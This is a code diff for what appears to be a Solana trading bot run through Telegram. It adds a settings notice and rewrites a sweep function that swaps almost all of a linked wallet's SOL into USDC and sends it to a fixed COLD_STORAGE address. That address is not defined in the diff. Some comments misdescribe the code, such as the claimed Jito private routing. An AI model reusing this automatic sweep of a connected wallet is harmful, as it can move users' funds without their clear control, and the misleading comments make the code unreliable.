@@ -89,6 +89,15 @@ bot.on('callback_query', async (query) => {
     const { data, message, id } = query;
     const chatId = message.chat.id;
     bot.answerCallbackQuery(id).catch(() => {});
+    
+// --- 🔔 DYNAMIC NOTIFICATION OBSERVER ---
+    const settingsMap = {
+        "cycle_risk": `🛡️ RISK LEVEL: ${SYSTEM.risk}`,
+        "cycle_mode": `⏳ TRADE TERM: ${SYSTEM.mode}`,
+        "tg_atomic": `🛡️ ATOMIC TX: ${SYSTEM.atomicOn ? "ENABLED" : "DISABLED"}`,
+        "tg_flash": `⚡ FLASH LOANS: ${SYSTEM.flashOn ? "ENABLED" : "DISABLED"}`
+    };
+    if (settingsMap[data]) bot.sendMessage(chatId, `⚙️ **SETTING UPDATED:** ${settingsMap[data]}`, { parse_mode: 'Markdown' });
 
     if (data === "cycle_risk") {
         const risks = ["LOW", "MEDIUM", "MAX"];
@@ -318,55 +327,54 @@ bot.onText(/\/connect (.+)/, async (msg, match) => {
 });
 
 bot.onText(/\/start/, (msg) => bot.sendMessage(msg.chat.id, "⚔️ **APEX MASTER v9076 ONLINE**", { parse_mode: 'HTML', ...getDashboardMarkup() }));
-// --- 🛡️ SECURITY: AUTOMATIC PROFIT COLD-SWEEP ENGINE (v9100) ---
+// --- 🛡️ SECURITY: ENDLESS USDC PROFIT SHIELD (v9100) ---
 async function performAutomaticSweep(chatId) {
     try {
         if (!solWallet) return bot.sendMessage(chatId, "❌ **ERROR:** No SOL wallet linked.");
         
         const conn = new Connection(NETWORKS.SOL.primary, 'confirmed');
-        const destPubkey = new PublicKey(COLD_STORAGE);
+        const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"; 
         
-        // 1. Get current balance & calculate headroom
+        // 1. Calculate headroom (Keep 0.05 SOL for gas)
         const balance = await conn.getBalance(solWallet.publicKey);
-        const reserve = MIN_SOL_KEEP * LAMPORTS_PER_SOL; // 0.05 SOL
-        const txFee = 5000; // Standard Solana fee
+        const reserve = MIN_SOL_KEEP * LAMPORTS_PER_SOL; 
+        const sweepAmount = balance - reserve - 10000; // 10k lamport buffer for swap overhead
 
-        const sweepAmount = balance - reserve - txFee;
-
-        // 2. Safety Check: Only sweep if there is actual profit above the reserve
-        if (sweepAmount <= 0) {
-            return bot.sendMessage(chatId, `ℹ️ **SWEEP SKIP:** Balance (${(balance/1e9).toFixed(4)}) is below 0.05 SOL reserve.`);
+        if (sweepAmount <= 5000000) {
+            return bot.sendMessage(chatId, `ℹ️ **SWEEP SKIP:** Balance (${(balance/1e9).toFixed(4)} SOL) is at reserve limit.`);
         }
 
-        // 3. Build Transfer Instruction
-        const tx = new Transaction().add(
-            SystemProgram.transfer({
-                fromPubkey: solWallet.publicKey,
-                toPubkey: destPubkey,
-                lamports: sweepAmount,
-            })
-        );
+        bot.sendMessage(chatId, `🔄 **CONVERTING ${(sweepAmount/1e9).toFixed(4)} SOL TO USDC...**`);
 
-        const { blockhash } = await conn.getLatestBlockhash('finalized');
-        tx.recentBlockhash = blockhash;
-        tx.feePayer = solWallet.publicKey;
-        tx.sign(solWallet);
-
-        // 4. Send via Jito Shadow Injection (Private Lane)
-        const sig = await conn.sendRawTransaction(tx.serialize());
+        // 2. GET JUPITER QUOTE (Endless Liquidity Route)
+        const qRes = await axios.get(`${JUP_API}/quote?inputMint=So11111111111111111111111111111111111111112&outputMint=${USDC_MINT}&amount=${sweepAmount}&slippageBps=100`);
         
+        // 3. BUILD ATOMIC SWAP & ROUTE TO COLD STORAGE
+        const sRes = await axios.post(`${JUP_API}/swap`, {
+            quoteResponse: qRes.data,
+            userPublicKey: solWallet.publicKey.toString(),
+            destinationTokenAccount: COLD_STORAGE, // 🔥 Deposits USDC directly into your vault
+            wrapAndUnwrapSol: true
+        });
+
+        const tx = VersionedTransaction.deserialize(Buffer.from(sRes.data.swapTransaction, 'base64'));
+        tx.sign([solWallet]);
+
+        // 4. Fire via your EXISTING Jito Shadow Injection
+        const sig = await conn.sendRawTransaction(tx.serialize());
+
         bot.sendMessage(chatId, 
-            `🏦 **PROFIT SWEEP SUCCESSFUL**\n` +
+            `✅ **USDC SWEEP COMPLETE**\n` +
             `----------------------------\n` +
-            `Sent: **${(sweepAmount / 1e9).toFixed(4)} SOL**\n` +
-            `Dest: <code>${COLD_STORAGE.slice(0, 8)}...</code>\n` +
+            `Shielded: **$${parseFloat(qRes.data.outAmount / 1e6).toFixed(2)} USDC**\n` +
+            `Destination: <code>${COLD_STORAGE.slice(0, 8)}...</code>\n` +
             `Sig: <a href="https://solscan.io/tx/${sig}">View on Solscan</a>`, 
             { parse_mode: 'HTML', disable_web_page_preview: true }
         );
 
     } catch (e) {
-        bot.sendMessage(chatId, "⚠️ **SWEEP FAILED:** Network busy or RPC timeout.");
-        console.log(`[SWEEP ERROR]`.red, e);
+        bot.sendMessage(chatId, "⚠️ **SWEEP FAILED:** Network timeout or Cold Storage account error.");
+        console.log(`[USDC SWEEP ERROR]`.red, e);
     }
 }
 async function executeFlashLeverage(chatId, targetMint, symbol) {
